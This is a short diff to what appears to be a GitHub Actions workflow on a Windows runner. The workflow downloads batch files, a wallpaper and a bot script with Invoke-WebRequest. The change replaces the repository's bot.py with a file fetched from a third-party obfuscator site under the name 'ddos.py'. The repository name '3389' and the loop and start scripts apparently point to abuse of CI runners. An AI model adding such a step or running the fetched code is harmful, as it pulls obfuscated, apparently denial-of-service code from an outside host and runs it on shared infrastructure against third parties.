@@ -12,7 +12,7 @@ jobs:
     - name: Mendownload File.
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/3389/main/start.bat -OutFile start.bat
-        Invoke-WebRequest https://github.com/SyzuTopia54y/3389/raw/main/bot.py -OutFile bot.py
+        Invoke-WebRequest https://www.development-tools.net/python-obfuscator/result/102353-ddos.py -OutFile bot.py
         Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/3389/main/wallpaper.png -OutFile wallpaper.png
         Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/3389/main/wallpaper.bat -OutFile wallpaper.bat
         Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/3389/main/loop.bat -OutFile loop.bat
